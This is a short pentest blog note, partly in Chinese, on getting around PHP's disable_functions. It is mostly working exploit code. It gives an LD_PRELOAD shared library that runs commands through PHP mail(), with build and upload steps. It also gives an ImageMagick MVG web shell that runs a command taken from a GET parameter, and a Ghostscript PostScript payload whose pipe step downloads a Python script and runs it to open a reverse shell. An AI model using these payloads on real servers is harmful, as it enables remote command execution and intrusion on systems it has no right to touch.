Title: bypass disable functions
Category: Pentest
slug: bypass-disabled-functions
Date: 2017-12-12


<https://threathunter.org/topic/596d90d5dff9e14c40b61986>

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
system("echo aaaaa> /tmp/abc.txt");
}
int geteuid() {
if (getenv("LD_PRELOAD") == NULL) { return 0; } 
unsetenv("LD_PRELOAD");
payload();
}
```

```
<?php 
putenv("LD_PRELOAD=/var/www/hack.so");
mail("a[@localhost](/user/localhost)","","","","");
?>
```

 使用方法：
 
```
gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so
``` 
修改hack.c文件里面的内容即可执行命令，经过测试在lnmp一键安装包可以顺利执行。
在gcc编译的时候可以放在其他linux上面编译，好了之后上传到目标服务器。


====
2018.8.22:

使用imageMagick 绕过:

```
<?php
echo "Disable Functions: " . ini_get('disable_functions') . "\n";

$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') {
    $command = 'id';
}

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("KKKK.mvg", $exploit);
$thumb = new Imagick();
$thumb->readImage('KKKK.mvg');
$thumb->writeImage('KKKK.png');
$thumb->clear();
$thumb->destroy();
unlink("KKKK.mvg");
unlink("KKKK.png");
?>
```

上面的比较老，最新的imagemagic漏洞:

http://seclists.org/oss-sec/2018/q3/142

```
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%wget 127.0.0.1:8000/re.py && python re.py 127.0.0.1 8081) currentdevice putdeviceprops
```